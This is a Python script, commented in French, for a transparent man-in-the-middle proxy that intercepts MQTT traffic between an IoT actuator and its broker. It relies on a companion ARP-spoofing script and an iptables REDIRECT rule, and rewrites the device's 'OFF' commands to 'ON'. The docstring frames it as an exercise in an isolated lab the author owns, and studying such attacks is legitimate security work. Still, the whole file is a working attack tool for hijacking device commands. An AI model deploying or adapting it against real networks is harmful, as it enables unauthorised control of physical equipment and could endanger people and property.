#!/usr/bin/env python3
"""
proxy.py — Proxy TCP transparent MITM pour MQTT (étape A : altération de commande).

Termine la connexion de l'actionneur (.223) détournée par REDIRECT, ouvre sa
propre connexion vers le vrai broker (.182), et relaie les octets dans les deux
sens. Réécrit au passage la commande MQTT OFF -> ON (sens broker -> actionneur).

Comme on TERMINE les connexions TCP, chaque pile TCP (la nôtre côté actionneur,
la nôtre côté broker) gère ses propres numéros de séquence : on peut donc changer
la LONGUEUR du payload librement (ON=2, OFF=3) sans casser quoi que ce soit.

Prérequis (en parallèle) :
  - spoof.py qui tourne, ciblant .223 <-> .182
  - net.ipv4.ip_forward=1
  - la règle REDIRECT (voir plus haut)
Usage : sudo ./venv/bin/python3 proxy.py
Arrêt : Ctrl+C
Cadre : laboratoire isolé dont je suis propriétaire (pédagogique).
"""
import socket
import struct
import threading
import sys

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8888
# SO_ORIGINAL_DST n'est pas exposé par le module socket : sa valeur est 80 sur Linux
SO_ORIGINAL_DST = 80


# --- Réécriture applicative MQTT ---------------------------------------------
# On ne touche QUE le PUBLISH sur labo/actionneur/commande, payload OFF -> ON.
TOPIC_CMD = b"labo/actionneur/commande"

def rewrite_broker_to_device(data: bytes) -> bytes:
    """
    Flux broker -> actionneur. Si on repère un PUBLISH de commande avec payload
    'OFF', on le réécrit en 'ON'. Longueur différente : OK, on reconstruit le
    paquet MQTT proprement (y compris l'octet 'remaining length').
    """
    # Un PUBLISH QoS0 commence par 0x30. Vérif rapide + présence du topic.
    if data[:1] == b"\x30" and TOPIC_CMD in data and b"OFF" in data:
        # On reconstruit un PUBLISH minimal propre pour ce topic + 'ON'.
        # Format MQTT 3.1.1 PUBLISH QoS0 :
        #   [0x30][remaining length][topic len (2o)][topic][payload]
        topic = TOPIC_CMD
        payload = b"ON"
        variable = struct.pack("!H", len(topic)) + topic + payload
        remaining = encode_remaining_length(len(variable))
        new_pkt = b"\x30" + remaining + variable
        print(f"[ALTÉRÉ] commande OFF -> ON  "
              f"({len(data)} o reçus -> {len(new_pkt)} o émis)", flush=True)
        return new_pkt
    return data

def encode_remaining_length(n: int) -> bytes:
    """Encode la 'remaining length' MQTT (varint 7 bits, bit de poids fort = suite)."""
    out = bytearray()
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out.append(byte)
        if n == 0:
            break
    return bytes(out)

# --- Plomberie du proxy transparent ------------------------------------------
def get_original_dst(conn: socket.socket):
    """Récupère la destination d'origine (le vrai broker) avant le REDIRECT."""
    # SO_ORIGINAL_DST renvoie une struct sockaddr_in : famille, port, IP...
    raw = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    port = struct.unpack("!H", raw[2:4])[0]
    ip = socket.inet_ntoa(raw[4:8])
    return ip, port

def pipe(src: socket.socket, dst: socket.socket, transform=None, label=""):
    """Relaie les octets de src vers dst, en appliquant 'transform' si fourni."""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            if transform:
                data = transform(data)
            dst.sendall(data)
    except OSError:
        pass
    finally:
        # Ferme les deux bouts pour débloquer l'autre thread
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass

def handle_client(device_conn: socket.socket, device_addr):
    # 1) Où allait réellement l'actionneur ? (le vrai broker, avant REDIRECT)
    try:
        orig_ip, orig_port = get_original_dst(device_conn)
    except OSError as e:
        print(f"[!] SO_ORIGINAL_DST échec pour {device_addr}: {e}", flush=True)
        device_conn.close()
        return
    print(f"[+] {device_addr} voulait joindre {orig_ip}:{orig_port} -> on relaie", flush=True)

    # 2) On ouvre NOTRE connexion vers le vrai broker
    broker_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        broker_conn.connect((orig_ip, orig_port))
    except OSError as e:
        print(f"[!] connexion au broker {orig_ip}:{orig_port} impossible: {e}", flush=True)
        device_conn.close()
        return

    # 3) Deux threads de relais :
    #    - actionneur -> broker : tel quel (CONNECT, SUBSCRIBE, etat, pings)
    #    - broker -> actionneur : on applique la réécriture de commande
    t1 = threading.Thread(target=pipe, args=(device_conn, broker_conn),
                          kwargs={"label": "dev->broker"}, daemon=True)
    
    t2 = threading.Thread(target=pipe, args=(broker_conn, device_conn),
                          kwargs={"transform": rewrite_broker_to_device,
                                  "label": "broker->dev"}, daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()
    print(f"[-] session {device_addr} terminée", flush=True)

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(16)
    print(f"[*] Proxy transparent à l'écoute sur {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Réécriture : PUBLISH {TOPIC_CMD.decode()}  OFF -> ON")
    print("[*] Ctrl+C pour arrêter.")
    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=handle_client, args=(conn, addr),
                             daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du proxy.")
    finally:
        srv.close()

if __name__ == "__main__":
    main()
